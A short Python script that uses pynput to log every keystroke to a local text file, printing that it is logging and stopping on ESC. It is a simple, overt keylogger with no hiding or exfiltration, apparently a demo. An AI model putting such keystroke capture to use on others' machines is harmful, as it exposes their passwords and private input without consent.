from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:

        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:

        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False
print("[+]Logging keys from user")
print("[+]Logging... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()